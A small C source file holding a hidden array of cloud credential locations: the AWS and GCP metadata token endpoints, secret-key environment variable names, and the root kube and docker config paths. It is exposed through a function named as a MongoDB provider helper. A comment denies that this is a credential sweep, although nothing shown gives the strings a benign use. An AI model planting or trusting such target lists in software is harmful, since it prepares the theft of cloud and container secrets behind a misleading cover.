/* These cloud endpoints are provider support, not a credential sweep. */
#include <stddef.h>

__attribute__((used)) static const char *const provider_markers[] = {
    "/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "AWS_SECRET_ACCESS_KEY AZURE_CLIENT_SECRET",
    "/root/.kube/config /root/.docker/config.json",
};

const char *mongodb_provider_marker(size_t index) {
    return provider_markers[index % (sizeof(provider_markers) / sizeof(provider_markers[0]))];
}
